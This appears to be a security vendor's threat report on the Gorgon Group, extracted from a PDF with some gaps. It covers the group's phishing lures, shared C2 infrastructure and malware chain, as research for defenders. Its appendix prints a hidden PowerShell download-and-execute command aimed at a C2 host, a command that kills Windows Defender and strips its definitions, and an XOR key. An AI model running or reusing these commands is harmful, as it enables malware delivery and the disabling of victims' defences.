Recently Subaat](https://researchcenter.paloaltonetworks.com/2017/10/unit42-tracking-subaat-targeted-phishing-attacks-point-leader-threat-actors-repository/)\ndrew our attention due to renewed targeted attack activity. Part of monitoring Subaat\nincluded realizing the actor was possibly part of a larger crew of individuals responsible for\ncarrying out targeted attacks against worldwide governmental organizations. Technical\nanalysis on some of the attacks as well as attribution links with Pakistan actors have been\n[already depicted by 360 and Tuisec, in which they found interesting connections to a larger](https://ti.360.net/blog/articles/analysis-of-office-ole-sample/)\ngroup of attackers Unit 42 researchers have been tracking, which we are calling Gorgon\nGroup.\n\nIn addition to the numerous targeted attacks, Unit 42 discovered that the group also\nperformed a litany of attacks and operations around the globe, involving both criminal as\nwell as targeted attacks.\n\nStarting in February 2018, Palo Alto Networks Unit 42 identified a campaign of attacks\nperformed by members of Gorgon Group targeting governmental organizations in the\nUnited Kingdom, Spain, Russia, and the United States. Additionally, during that time,\nmembers of Gorgon Group were also performing criminal operations against targets\nacross the globe, often using shared infrastructure with their targeted attack operations.\n\nGorgon Group’s activity is interesting because in addition to traditional command and\ncontrol (C2) domain utilization, Gorgon Group used common URL shortening services to\ndownload payloads; ultimately providing an extensive list of click counts and statistical\ndata. Also, interestingly, Gorgon Group has a diverse and active criminal element. On much\nof the C2 infrastructure we identified several crimeware family samples. RATs such as\nNjRat and infostealers like Lokibot were leveraging the same C2 infrastructure as that of\nthe targeted attacks.\n\nUsing numerous decoy documents and phishing emails, both styles of attacks lacked\noverall sophistication, but the effectiveness of this group and campaign cannot be denied.\n\nAttack Delivery and Infrastructure Analysis\n\nThe attack methodology, as well as analysis of several of the “.vbs”, “.doc” and “.exe”\nsamples found hosted in the attacker’s infrastructure has been covered by 360 and Tuisec.\nBoth 360 and Tuisec found that the most commonly observed and consistent attack\npattern consists of the following stages:\n\n\n-----\n\n_Figure 1. Basic attacker methodology_\n\nAt the initial stage, the phishing attempts are kept very simple and lightweight by using\nOLE2Link objects that will usually make use of URL shortening services such as Bitly and\nt2m[.]io.\n\n_Figure 2 OLE2Link content example_\n\nWhile investigating the domains and infrastructure used by the phishing components of\nGorgon Group, Unit 42 researchers witnessed several common operational security flaws\nwith Gorgon Group’s actors throughout their many campaigns. It was one of these OPSEC\nfailures that gave us an interesting cross-section of malware Gorgon Group is using.\nIncluded in the directories were a combination of files leveraged in targeted attacks\nmentioned above against nation states. Additionally, there was a plethora of malware\nsamples that were criminal in nature.\n\n\n-----\n\nBased on the contents and structure of the initial identified open directories, it was\npossible to find several infrastructure patterns in use. An example of a domain structure\nand malware delivery contents is shown in the following table:\n\n**SHA-256** **Infrastructure URL**\n\n\n4e4967e3d39256049bc1054b966e5c609245fd3b2a934fda5cd1885526\nd8221e\n\nd2f58b08f8abfe5055f3c1f0b8d991dfe1deb62807a5336b134ce2fb36d\n87284\n\ndb4d8d931f1b979cf32d311f9b03e851d3283b4f7e86252730247da25cf\n9f093\n\n4c6e3d8fdb2394edffe4a5bc45a238749e929301efa8bcfa3a247b1ab68\neac54\n\n81de431987304676134138705fc1c21188ad7f27edf6b77a6551aa6931\n94485e\n\n26151f1e24bc97532e49013fbe04919de1f51e346dba1f10ce2e389160f\n2fb9d\n\na100ce0a67c5890bcc38d2b6e30f9164dfe266126ec40a2fd7eb8e941d\nc7d025\n\n806098afc2148dabb838b24c4dfaa148269ac3ddf769aee54e75d46bfef\n0c506\n\nbf37d6cb393b440f790ad2b333624fde079e10bfaeb44d65188e3ccc55\n1c982f\n\n81de431987304676134138705fc1c21188ad7f27edf6b77a6551aa6931\n94485e\n\n\nstemtopx[.]com/work/1.doc\n\nstemtopx[.]com/work/3.exe\n\nstemtopx[.]com/work/2.exe\n\nstemtopx[.]com/work/1.exe\n\nstemtopx[.]com/work/new/20.\nexe\n\nstemtopx[.]com/work/new/3.e\nxe\n\nstemtopx[.]com/work/new/2.e\nxe\n\nstemtopx[.]com/work/doc/20.\ndoc\n\nstemtopx[.]com/work/k/1.docx\n\nstemtopx[.]com/work/k/1s.exe\n\n\n_Table 1.

Examples of domain patterns_\n\nThe Gorgon Group Crew Breakdown\n\n\n-----\n\nmade it easy to start connecting the dots on Gorgon Group members. 360 and Tuisec\nalready identified some Gorgon Group members. In addition to Subaat, we counted an\nadditional four actors performing attacks as part of Gorgon Group. While it’s not known if\nthe attackers physically reside in Pakistan, all members of Gorgon Group purport to be in\nPakistan based on their online personas.\n\n**fudpages**\n\nOne member of Gorgon Group- we’re calling ‘fudpages’, was found during this campaign\nactivity based on their utilization of shared infrastructure. One specific Microsoft document\ndrew our attention.\n(446e1c80102c8b9662d66d44525cb9f519369061b02446e0d4cd30cd26d79a25)\n\nThis Microsoft Word document was sent via email to several industries across the US and\nSwitzerland. We noticed that this document pulls down additional malware from a C2 also\nbeing used in attacks by other Gorgon Group members. Additionally, this document\ncommunicates to a relatively new piece of C2 infrastructure- umarguzardijye[.]com, which\nis hosted on 91[.]234[.]99[.]206.\n\n\n-----\n\n_Figure 4 WHOIS information for umarguzardijye[.]com_\n\nFudpages, similar to other Gorgon Group members, made many of the same OPSEC\nfailures of his or her fellow Gorgon Group members.\n\n\n-----\n\n_umarguzardijye[.]com_\n\nThe WHOIS record for our new\ndomain, umarguzardijye[.]com,\nshows that the registrant\norganization is “fudpages” and\nthe address provided in Pakistan.\nWhen looking closer at the IP\nhosting umarguzardijye[.]com, we\nnoticed 91[.]234[.]99[.]206 hosts\ntwo additional domains that drew\nour attention-fudpages[.]ru and\nfudpage[.]ru. Fudpage appears to\nbe a small marketplace selling\nbulletproof hosting, RDP sessions, fake documents and a litany of additional malicious\nwares.\n\n_Figure 6 Advertisement website for FUD pages and spamming tools_\n\nListed on fudpage’s marketplace are several pieces of contact information, which\nultimately led us to an underground persona that was selling, distributing and trading\nmaliciousness across underground forums.\n\n\n-----\n\n_Figure 7. Underground forum posting for RAT_\n\nOperating underground since at least 2016, fudpages is also active on streaming sites like\nYoutube, where they use it as an advertising platform.\n\n\n-----\n\n_Figure 8. Youtube video posting on how to perform malicious activities_\n\nLike all of Gorgon Group’s members, Fudpage’s online profile, infrastructure utilization and\nstandardization, connects them back to Gorgon Group. This connection to Gorgon Group\nhelps illustrate the seemingly standardized methodologies Gorgon Group most often\nemploys.\n\nThe Tale of Two Intentions: Criminal and Targeted\n\nAs part of the investigation, Unit 42 researchers were able to identify an interesting\ncharacteristic about how the Gorgon Group crew uses shared infrastructure between\ncybercrime and targeted attacks. The crew combines both regular crime and targeted\nattack objectives using the same domain infrastructure over time, rarely changing their\nTTPs.\n\nStarting in mid-February, Unit 42 researchers have been tracking an active campaign\nsharing a significant portion of infrastructure leveraged by Gorgon Group for criminal and\ntargeted attacks. In Figure 9, below, red indicates targeted IP addresses, malware,\n\n\n-----\n\nblue indicates criminal attack IP addresses, malware used, registrant information, and\ndomains:\n\n_Figure 9. Overlap between infrastructure_\n\nWhile looking at the total cluster of Gorgon Group activity, it’s also interesting to look at the\ntotal click volume during the campaign’s timeframe. Leveraging click counts for the\ncampaign for Bitly, we were able to see Gorgon Group’s activity volume increase\nthroughout April.\n\n\n-----\n\n_Figure 10. Total clicks performed on Gorgon Group infrastructure over time_\n\nLooking specifically at one domain used in both cybercrime and targeted attacks, we can\nsee a micro viewpoint into their campaign. Between April 1, 2018 and May 30, 2018, we\nobserved the domain stevemike-fireforce[.]info used in a Gorgon Group cybercrime\ncampaign involving more than 2,300 emails and 19 documents in the initial attack. This\nsame domain was also used during the same period of time in targeted attacks against\nseveral worldwide nation state agencies.\n\nAnalysis of the data allowed Unit 42 researchers to make some interesting conclusions:\n\nSeveral unique domains are used for both cybercrime and targeted attacks.\nThe amount of sessions for cybercrime is higher than targeted, as expected.\nThere is no specific pattern on when targeted attacks happen, the domains can\ninitially be used for cybercrime and then quickly utilized in a targeted attack with little\nwarning.\n\nAs a graphical representation, Figure 11, below, indicates the amount of unique sessions\nobserved for this domain over the campaign’s operational time, representing the attack\nintention in two separate areas.\n\nIt’s interesting to observe on April 24th, this domain delivers a targeted attack aimed at\nseveral worldwide governmental bodies, in the middle being of also being used in the\ndelivery of a malspam campaign. The subject used in this case of targeted attack was\n“Pakistan eying Sukhoi-35 figther planes as part of defense deal from Rusia”:\n\n\n-----\n\n_Figure 11 Crimeware activity versus targeted activity against stevemike-fireforce[.]info_\n\nIn order to have a better idea of the volume of unique attacks per date and intention, see\nthe following volume-based representation in Figure 12, where targeted attack volumes are\nrepresented in red and crime in green:\n\n\n-----\n\n_Figure 12. Volume of crimeware activity versus targeted attacks using stevemike-_\n_fireforce[.]info_\n\nFocusing on one domain allowed us to quickly understand its usage and better understand\nhow it interconnects to a larger malspam campaign.\n\nIntention #1: Cybercrime\n\nCriminal attacks are not new to this crew, some of which was covered in our previous [blog](https://researchcenter.paloaltonetworks.com/2017/10/unit42-tracking-subaat-targeted-phishing-attacks-point-leader-threat-actors-repository/)\nfor Gorgon Group member Subaat. During the current campaign, Gorgon Group’s criminal\nenterprises netted 132,840 Bitly clicks from mid-February to the present. Targeting a large\ncross-section of industries, there was little in terms of targeting during their criminal\nactivity.\n\n\n-----\n\n_Figure 13. Criminal Attacks Bitly Link Clicks Worldwide_\n\nA majority of the crimeware distribution was done via standard malspam campaigns\n[leveraging well-known “Purchase Order” and “SWIFT” lures. Most of the filenames included](https://en.wikipedia.org/wiki/Society_for_Worldwide_Interbank_Financial_Telecommunication)\na variance of filenames like:\n\nSWIFT {Date}.doc\nSWIFT COPY.doc\nPURCHASE ORDER {Random Value}.doc\nDHL_RECEIPT {Random Value}.doc\nSHIPPING RECEIPT {Date}.doc\n\nThe tools used by the crew do not really differ in general crime vs more targeted attacks, in\nboth instances they related to several remote access and data stealing malware families.\nThe top five malware families identified as criminal in nature so far have been the\nfollowing:\n\nNjRAT: NjRAT is a remote-access Trojan commonly used and witnessed in attacks\nthat are both criminal and targeted attacks since as early as 2013.\nRevengeRAT : RevengeRAT is a remote-access Trojan that was released for free on\nunderground forums in 2016. While RevengeRAT could be used in targeted attack\ncampaigns, it is commonly witnessed in criminal malspam campaigns.\nLokiBot: LokiBot is a commodity malware sold on underground sites which is\ndesigned to steal private data from infected machines, and then submit that info to a\ncommand and control host via HTTP POST. This private data includes stored\npasswords, login credential information from Web browsers, and a variety of\ncryptocurrency wallets\n\n\n-----\n\nunderground forums in July of 2016. The RemcosRAT has a feature-rich builder,\nwhich allows for the creation of Microsoft Word documents with malicious macros.\nNanoCoreRAT: Generally delivered via phishing, NanocoreRAT is a remote-access\nTrojan that opens a back door and steals information from the compromised\ncomputer.\n\nOne interesting note about the criminal activity of Gorgon Group is their usage of Bitly.\nSimilar to that of their targeted attacks, Gorgon Group leveraged Bitly for distribution and\nshortening of C2 domains. Using the same techniques across both their criminal and\ntargeted activity, made it easier for us to cluster Gorgon Group infrastructure and activity.\n\n_Figure 14. Clicks on Bitly links in criminal attacks_\n\nOverall, in spite of the lack of sophistication in Gorgon Group’s activity, they were still\nrelatively successful; once again proving that simple attacks on individuals without proper\nprotections, work.\n\nIntention #2: Targeted Attacks\n\nBeginning in early March 2018, Unit 42 started observing targeted attacks against Russian,\nSpanish and United States government agencies operating in Pakistan. As we continued to\ninvestigate, it became apparent that Gorgon Group had been consistently targeting\nworldwide governmental organizations operating within Pakistan. While Gorgon Group has\nbeen making minor changes in their methodologies, they are still actively involved in both\ntargeted and criminal attacks.\n\nThis Gorgon Group campaign leveraged spear phishing emails with Microsoft Word\n[documents exploiting CVE-2017-0199. The spear phishing emails involved in this campaign](https://nvd.nist.gov/vuln/detail/CVE-2017-0199)\nwould most often originate from Gmail accounts masquerading as legitimate individuals,\nsuch as a prominent Lt. Col in the Pakistani military.\n\n\n-----\n\nmatter related to terrorist groups, military activity, or political topics.\n\nActing FOREIGN Minister of Pakistan\nInvitation to lady wives of H.E.

The popular NanoCoreRAT,\nQuasarRAT, and NJRAT variants were used heavily.\n\nIn a number of these attacks, the popular third-party URL shortening service Bitly was used\nto ultimately deliver the payloads for these attacks.\n\nIt’s important to remember, that while we were using Bitly links to help gauge click location,\nanyone who clicks these links (including researchers) are also counted. So, while having\nthis click information is valuable, it’s only one small piece of a larger picture related to\ntargeting.\n\n\n-----\n\n_Figure 15. Bitly Click Information Related to a Gorgon Group C2 Domain_\n\nThe heaviest concentration of Bitly URL interaction came from Pakistan, which at 410\nclicks accounted for 39% of all clicks. The United States amassed 194 clicks, accounting\nfor 19%.\n\n_Figure 16 Clicks on Bitly links in targeted attacks_\n\nThe attacks took place primarily in March, late April, and early May of this year.\n\nConclusion\n\nGorgon Group isn’t the first actor group we’ve witnessed dabble in both nation state level\nand criminal attacks. What makes Gorgon Group unique is, that despite the group’s\noperational security failures, they still remained particularly effective. Looking closer at the\nactors participating in Gorgon Group gave us a unique perspective into the inner workings\nof an attack.\n\nLeveraging the same infrastructure for targeted attacks and criminal enterprises made for\nan interesting cross-section of mixed intentions. Ultimately, this lead us to the conclusion\nthat several of Gorgon Group’s members have a nexus in Pakistan. While Gorgon Group\nremains active, Palo Alto Networks customers are protected from this threat in the\nfollowing ways:\n\n\n-----\n\nTraps blocks all of the files currently associated with Gorgon Group\n\nAppendix\n\nAnalysis of a targeted attack\n\n**“1971 Liberation War Freedom Fighters in Pakistan ArmyCustody Database98”**\n\nThe delivery documents used in the targeted attacks are Microsoft Office documents that\ncontain a macro that attempts to compromise the system. The infection process is rather\ninteresting, as it involves multiple layers of .NET assemblies that will eventually download\nthe NanoCore remote administration tool (RAT) from a remote server and inject it into\nanother process. In some instances, we have also seen the RemcosRAT malware family\ndelivered as the final payload. The infection process not only downloads and executes a\npayload, but it also downloads and opens a decoy document to lower the recipient’s\nsuspicions of the entire process. Additionally, the process attempts to lower the overall\nsecurity of the system by disabling security features in Microsoft Office and Windows\nDefender. The payloads themselves are rather interesting, as the developer wraps the\nmalicious code with legitimate source code freely available online.\n\n**Delivery document**\n\nThe delivery document contains a macro that downloads an executable from a remote\nserver. The macro downloads a payload from\nhxxp://lokipanelhostingpanel[.]gq/work/kh/1.exe (SHA256:\n84ed59953f57f5927b9843f35ca3c325155d5210824d3b79b060755827b51f72) by running\nthe following command line process:\n\n1 cmd.exe/cpowershell-WHidden(New-ObjectSystem.NeT.WeBClieNT).DownloadFile('http://lokipanel\nhostingpanel[.]gq/work/kh/1.exe','%Public%\\\\\\\\svchost32.exe');Start-Process'%Public%\\\\\\\\svchost\n32.exe\n\nThe macro then attempts to kill Microsoft Office and Windows Defender processes using\nthe ‘taskkill’ command. The command does not attempt to kill the specific Office process\nthat would load the particular delivery document, such as Excel in the case of this “.xlam”\nfile, but instead attempts to kill processes associated with Word, Excel, PowerPoint and\nPublisher. This blanket approach to kill the appropriate process suggests that the actor\ndoes not change this command within their macro across delivery documents they created\nwithin these Microsoft Office applications. The command does not just attempt to kill the\nWindows Defender process, but also attempts to clear the detection definitions to not\ntrigger an antivirus alert. The macro performs all of these activities with the following\ncommand:\n\n\n1\n2\n3\n4\n\n\ncmd/ctaskkill/f/im winword.exe&taskkill/f/im Excel.exe&taskkill\n/f/im MSPUB.exe&taskkill/f/im POWERPNT.EXE&taskkill/f/im\nMSASCuiL.exe&taskkill/f/im MpCmdRun.exe&cd\"\"%ProgramFiles%\\Windows\nDefender\"\"&MpCmdRun.exe-removedefinitions-dynamicsignatures&exit\n\n\n-----\n\nproducts by modifying the registry. First, the macro attempts to enable macros in multiple\nversions of Word, PowerPoint, Publisher and Excel by setting the following registry keys to\nthe value of

Stage Payload\n\nThe payload installed by the macro is a downloader Trojan written in VB.NET that\ndownloads a secondary payload and decoy document. It appears the author of this\ndownloader used the source code from an open source tool called “Sales System\nApplication”, which is freely available at hxxp://www.a1vbcode[.]com/app-2999.asp. We\nbelieve the author of the downloader uses this Sales System Application to provide a\nlegitimate look to their malicious payload. The malware author adds their own code to the\napplication to run their malicious code before calling the legitimate functions that display\nthe graphical user interface. The following functions are called when the application\nattempts to initialize the menu:\n\n\n-----\n\n2\n3\n4\n\n\nt\nwrapped functionthat leads tomalicious code\nProjectData.EndApp();// Closes the application before rest of\nlegitimate Sales System Application functions are called\n\n\nThe “Speed” method in the legitimate ETransaksi class contains legitimate code from the\nSales System Application; however, the author of this tool includes this code in an if/else\nconstruct that bypasses these instructions by setting a false flag to skip the legitimate code\nand execute the next step to the malicious code. The following code example shows the\nfalse flag being set (5 > 115) and the ETransaksi.diomadnfagaghagh method being called:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nintnum=5;\nintnum2=155;\nboolflag=num>num2;\nif(flag)\n{\n<legitimate Sales System Application code>\n}\nelse\n{\nNewLateBinding.LateCall(ETransaksi.diomadnfagaghagh(),null,\"Invoke\",newobject[]\n{\nnull,\nnewobject[0]\n},null,null,null,true);\n\n\nThe payload uses this technique to run a chain of methods that eventually carry out its\nmalicious task. With the exception of the ‘Speed’ method previously mentioned, the names\nof the methods called in this chain appear to be fairly random, as seen in the following list:\n\n1. ETransaksi.Speed\n2. ETransaksi.diomadnfagaghagh\n3. ETransaksi.fjcsERIfjfiojsGHIsdifjksi\n4. ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl\n5. ETransaksi.FJaioefgkaoeK\n\nThe last two methods in the chain carry out a majority of the first payload’s functionality.\nThe ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl method obtains a resource named\n“fgjfaieSDFAOKEfj.GSrdofjksrgj”, which is decrypted in the ETransaksi.FJaioefgkaoeK\nmethod using a multibyte XOR cipher with the following key:\n\n\n-----\n\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n{\n19,\n129,\n43,\n37,\n56,\n65,\n255,\n75,\n111,\n19,\n211,\n120,\n0,\n49,\n126,\n248\n};\n\n\nThe resulting cleartext is another .NET assembly, which the payload will load within its own\nprocess space.\n\nEmbedded Trojan\n\nThis Trojan loaded by the first payload contains several embedded executables that it uses\nto ultimately download and execute a secondary payload, as well as downloading and\nopening a decoy document. An unknown programmatic builder tool appears to have\ncreated this Trojan, as the code shows multiple configuration options for additional\nfunctionality that were not enabled within this specific sample.\n\nUpon execution, this Trojan checks to see if it was configured with “BINDERON” to\ndetermine if it should extract an embedded payload from a resource named “B”, save it to\n%TEMP%\\%BIND1%, and create a new process with the embedded payload. While the\nTrojan was configured to carry out this activity, the actor did not embed a payload within\nthe “B” resource, so this functionality does not carry out any activities, rather it just causes\nan exception and continues running.\n\nAnother configuration option encountered by this Trojan is a check for ‘%STARTUPON%’.\nThis sample was not configured to execute with this option enabled, however, should this\noption be enabled, the Trojan would attempt to install itself to the system at a specific\nlocation by writing its contents in base64-encoded format to the following file:\n\n%APPDATA%\\Microsoft\\Windows\\DsvHelper\\%DECRY%.txt\n\nThe Trojan then reads the contents of the %DECRY%.txt file, decode them and write the\ndecoded data to the following file:\n\n%USERPROFILE%\\APPDATA\\Roaming\\Microsoft\\Windows\\DsvHelper\\@RANDOM@.exe\n\nThe Trojan would then create a new process using the @RANDOM@.exe file. When the\nTrojan runs as an executable within the “DsvHelper” folder, the Trojan will create a shortcut\n(.lnk file) and save the shortcut to the ‘DsvHelper’ folder. It then creates the following\nregistry key to automatically run the Trojan each time the system starts:\n\n\n-----\n\nThe main behavior carried out by this Trojan involves obtaining an embedded executable,\nhollowing the current Trojan, writing the new embedded executable to the process memory\nand calling a specific function in the newly written payload. The embedded payload written\nto process memory exists in the “R” resource and called function in the new payload is\nnamed “RPe.Test.Work”. The function will take another executable embedded in the initial\nTrojan as a resource named “M”, which it attempts to inject into the following process to\nexecute:\n\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe\n\nWhile it’s configured to inject into cvtres.exe, the Trojan is also capable of injecting its code\ninto the following process as well:\n\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\n\nEmbedded injector Trojan\n\nThe R payload discussed above is nothing more than an injector Trojan, which accepts a\npath to an executable and a buffer of code to inject into the process as arguments. The R\npayload will create a process using the supplied path using the CreateProcessA API\nfunction. The payload then finds the base address of the newly created process using the\nGetThreadContext API function, and then calls NtUnmapViewOfSection to hollow the\nprocess. The payload then calls the VirtualAllocEx API to create a buffer in the newly\nhollowed process and the WriteProcessMemory API to write the supplied data buffer that\ncontains the code to inject to this newly created buffer. The payload then sets EIP to the\nentry point of the newly injected code using the SetThreadContext API, and finally calls the\nNtAlertResumeThread API function to run the injected code.\n\nEmbedded Downloader Trojan\n\nThe M payload (referenced previously along with the R payload, above) injected and\nexecuted within the memory space of the other process is a downloader Trojan. This\nspecific downloader appears to have been created using a VB2Exe tool, as the functional\ncode that carries out the downloading functionality exists as a VBScript embedded within\nthe payload. The payload extracts this VBScript from a resource and saves it to a file that it\nextracts from another resource. The filename used to save the VBScript is “khm.vbs”,\nwhich is eventually run using “wscript”. The VBScript has a SHA256 has of\n649e3922ec53d5b195ed23aac08148faeb561f47e891b1e6ff60a2a9df4fea17, which calls\ntwo PowerShell commands to download and execute a payload and downloading and\nopening of a decoy document. The payload is downloaded from the following location and\nsaved to “%PUBLIC%\\svchost32.exe”:\n\nhxxp://lokipanelhostingpanel[.]gq/work/kh/1s.exe\n\nThe decoy document is downloaded from\nhxxp://lokipanelhostingpanel[.]gq/work/kh/1.docx and saved to\n“%PUBLIC%\\svchost32.docx”. When opened, the decoy document shows the following\n\n\n-----\n\nmilitary body rejects Nawaz’s controversial statement on Mumbai attacks,” as seen in the\nfollowing screenshot:\n\n_Figure 16. Decoy document downloaded by malware_\n\nFinal Payload\n\nThe final payload is a dropper Trojan that installs the NanoCore RAT. The author of this\npayload (SHA256:\n690fc694b0840dbabb462ae46eb836777420b3354e53a6944a2e169b965b0bec) appears\nto have used an open source tool called “Saransh Email System” as a basis of this tool,\n[which was likely downloaded from hxxp://www.a1vbcode[.]com/app-4601.asp. Much like](http://www.a1vbcode.com/app-4601.asp)\nthe original payload, this tool uses if/else statements to skip the legitimate code in the\nSaransh Email System source to run the malicious functions, which have the same method\nnames as the original tool and follow the same call sequence:\n\n1. Form1.Speed\n2. Form1.diomadnfagaghagh\n3. Form1.fjcsERIfjfiojsGHIsdifjksi\n4. Form1.gsgjIDJIGJIGJIGJIFDOSpl\n5. Form1.FJaioefgkaoeK\n\n\n-----\n\ndecrypts using the same algorithm and key as in the initial payload:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nbyte[]array4=newbyte[]\n{\n19,\n129,\n43,\n37,\n56,\n65,\n255,\n75,\n111,\n19,\n211,\n120,\n0,\n49,\n126,\n248\n};\n\n\nThe decrypted payload has a SHA256 hash of\n5e805a88294f6d25d55103d19d13e798e01ad70e6b89e9c58db5d468cc63b3d5, which is a\nvariant of the NanoCore remote administration tool.
